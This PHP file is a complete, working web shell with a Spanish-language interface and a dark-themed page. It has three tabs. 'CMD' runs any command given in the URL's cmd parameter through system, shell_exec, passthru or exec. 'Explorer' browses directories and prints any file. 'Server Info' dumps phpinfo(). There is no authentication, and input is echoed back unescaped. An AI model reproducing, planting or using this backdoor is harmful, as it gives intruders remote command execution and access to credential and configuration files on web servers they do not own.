<?php
// Show file content
function showContent($file) {
    if (is_file($file)) {
        return file_get_contents($file);
    } else {
        return "No se pudo abrir el archivo.";
    }
}

// Exec cmd 
function execCMD( $cmd ){
  if(function_exists('system')){
    system($_GET['cmd']);
  }else if(function_exists('shell_exec')){
    shell_exec($_GET['cmd']);
  }else if(function_exists('passthru')){
    passthru($_GET['cmd']);
  }else if(function_exists('exec')){
    exec($_GET['cmd']);
  }
}

// nav menu
function navigation($action){
  echo '<div class="menu">
        <ul>
            <li><a href="?action=explorer" class="'.($action == 'explorer' || empty($action)?'active':'').'">Explorer</a></li>
            <li><a href="?action=cmd" class="'.($action == 'cmd'?'active':'').'">CMD</a></li>
            <li><a href="?action=server_info" class="'.($action == 'server_info'?'active':'').'">Server Info</a></li>
        </ul>
    </div>';
}

// Action CMD
function actionCMD($action){
  $cmd = isset( $_GET['cmd']) ? $_GET['cmd'] : '';
  echo '<div class="cmd-execute">
  <form method="get" name="'. basename($_SERVER['PHP_SELF']) .'">
    <input type="hidden" name="action" value="'.$action.'"/>
      <label><strong>Command:</strong></label>
      <input type="text" name="cmd" autofocus id="cmd" size="80" value="'. $cmd.'">
      <button type="submit">Execute</button>
    </form>
    <pre class="result"> ></br>';
      if(isset($_GET['cmd'])){
        execCMD($_GET['cmd']);
      }
  echo '</pre>
</div>';
}

// Action Explorer & view file content
function actionExplorer(){
  $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
  $files = scandir($dir);
  if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = showContent($file);
  }
    echo '<div class="breadcrumb"><strong>Jump:</strong> ';
            $breadcrumbs = explode('/', $dir);
            $path = '';
            foreach ($breadcrumbs as $breadcrumb) {
                $path .= $breadcrumb . '/';
                if ($breadcrumb != '.') {
                    echo '<a href="?dir=' . rtrim($path, '/') . '">' . $breadcrumb . '</a> / ';
                }
            }
            
    echo  '</div>';
         if (isset($content)):
            echo '<div class="file-content">
                <h2>'. basename($file) .'</h2>
                <p><a href="?dir='. urlencode(dirname($file)) .'">Back</a></p>
                <pre style="overflow:auto;" class="result">'. htmlspecialchars($content).'</pre>
                <p><a href="?dir='. urlencode(dirname($file)).'">Back</a></p>
            </div>';
        else:
            echo '<div class="file-browser">
                <table width="100%">
                  <thead>
                    <tr>
                        <th style="width: 50%; text-align:left;">Name</th>
                        <th style="width: 50%; text-align:left;">Type</th>
                    </tr>
                  </thead>
                  <tbody>';
                    if ($dir != '.'):
                       echo '<tr>
                            <td><a href="?dir='.dirname($dir).'">../</a></td>
                            <td style="text-align:center">Directory</td>
                        </tr>';
                    else:
                      echo '<tr>
                            <td><a href="?dir=./">./</a></td>
                            <td>&nbsp;</td>
                        </tr>';
                    endif;
                    foreach ($files as $file):
                      if ($file != '.' && $file != '..'):
                        echo '<tr>
                                <td>';
                                    if (is_dir($dir . '/' . $file)):
                                      echo '<a href="?dir='. $dir . '/' . $file .'">'.$file.'</a>';
                                    else:
                                      echo '<a href="?file='. $dir . '/' . $file .'">'.$file.'</a>';
                                    endif;
                             echo '</td>
                                <td style="text-align:left">
                                    '. (is_dir($dir . '/' . $file) ? 'Directory' : 'File') .'
                                </td>
                            </tr>';
                      endif;
                    endforeach;
            echo '</tbody>
              </table>
            </div>';
        endif;
}

function actionServerInfo(){
  echo '<pre style="overflow:auto" class="result">';
  phpinfo();
  echo '<pre>';
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell</title>
<style>
body {
  font-family: Arial, sans-serif;
  font-size:12px;
  background-color: #000;
  color: #fff;
  margin: 0;
  padding: 0;
}

a{
  color:#fff;
  text-decoration:none;
}

input{background-color:#525252; color:#fff;}

button{background-color:#000; border:none; color:#fff; cursor:pointer; padding: 5px 2px;}

.container {
    max-width: 960px;
    margin: 20px auto;
    background-color: #202020;
    padding: 20px;
    /* box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);*/
}

h1 {
    text-align: center;
}

.cmd-execute{
  margin-top: 20px;
}
.result{
  background-color:#525252;
  padding:5px;
}

.file-browser ul {
    list-style: none;
    padding: 0;
}

.file-browser ul li {
    padding: 10px;
    border-bottom: 1px solid #ddd;
}

.file-browser ul li a {
    text-decoration: none;
    color: #3498db;
}

.file-browser ul li a:hover {
    text-decoration: underline;
}

.breadcrumb {
  margin-top:10px;
  margin-bottom: 10px;
  background-color:#202020;
  border: 1px solid #444444;
  padding: 10px 0 10px 5px;
}

.breadcrumb a {
    text-decoration: none;
    color: #fff;
}

.breadcrumb a:hover {
    text-decoration: underline;
}

thead tr th{
  text-weight:bold;
  background-color:#525252; 
  color:#fff;
  padding:10px;
}

tbody tr td{
  padding: 10px;
}

tbody tr:hover{
  background-color:#7B7B7B;
}

.menu {
    background-color: #333;
    padding: 10px 0;
}

.menu ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    text-align: center;
}

.menu li {
    display: inline-block;
}

.menu li a {
  color: #fff;
  text-decoration: none;
  padding: 10px 20px;
  transition: background-color 0.3s;
  background-color: unset;
}

.menu li a:hover, .menu li a.active {
  background-color: #555;
}
</style>
</head>
<body>
  <div class="container">
    <h1>Webshell</h1>
    <?php $action = isset($_GET['action']) ? $_GET['action'] : '';?>
    <?php navigation($action); ?>
    <?php
      switch ($action) {
      case 'cmd':
          actionCMD($action);
          break;
      case 'server_info':
          actionServerInfo($action);
          break;
      case 'explorer':
        default:
          actionExplorer($action);
          break;
      }
    ?>
        
    </div>
</body>
</html>

